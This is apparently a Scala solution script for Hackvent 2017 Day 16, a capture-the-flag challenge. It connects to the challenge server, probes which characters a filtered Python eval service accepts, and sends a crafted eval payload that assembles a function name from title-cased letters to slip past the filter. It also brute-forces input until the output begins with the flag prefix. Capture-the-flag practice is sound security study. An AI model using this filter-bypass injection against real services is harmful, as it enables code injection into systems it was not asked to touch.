package hackvent2017

object Day16 {

  def main(args: Array[String]): Unit = {
    val nc = NetCat.open("challenges.hackvent.hacking-lab.com", 1034)
    try {
      // read prompt
      nc.read

      //val allowedChars = findAllowedChars(nc)
      //val argForFlagPrefix = findArgumentForExpectedResult(nc, allowedChars, "HV17-")

      val mask = (0 until 29).map(i => "1337".charAt(i % 4)).mkString
      println(callSanta(nc, mask))
    } finally {
      nc.close
    }
  }

  private def findAllowedChars(nc: NetCat): Seq[Char] = {
    (' ' to '~').filter { c =>
      nc.writeln(c.toString)
      !nc.read.contains("Denied")
    }
  }

  private def findArgumentForExpectedResult(nc: NetCat, allowedChars: Seq[Char], exptectedResult: String): String = {
    var arg = ""
    for (len <- 1 to exptectedResult.length) {
      var found: Option[Char] = None
      for (c <- allowedChars) {
        if (found.isEmpty) {
          val res = callSanta(nc, arg + c)
          if (res.startsWith(exptectedResult.substring(0, len))) {
            found = Some(c)
            println(s"'${arg + c}' -> '$res'")
          }
        }
      }
      arg += found.get
    }
    arg
  }

  private def callSanta(nc: NetCat, arg: String): String = {
    val msg = """print(eval('s'.title()+'a'.title()+'n'.title()+'t'.title()+'a'.title()+'("""" + arg + """")'))"""
    nc.writeln(msg)
    nc.read.split("\n")(0)
  }

}
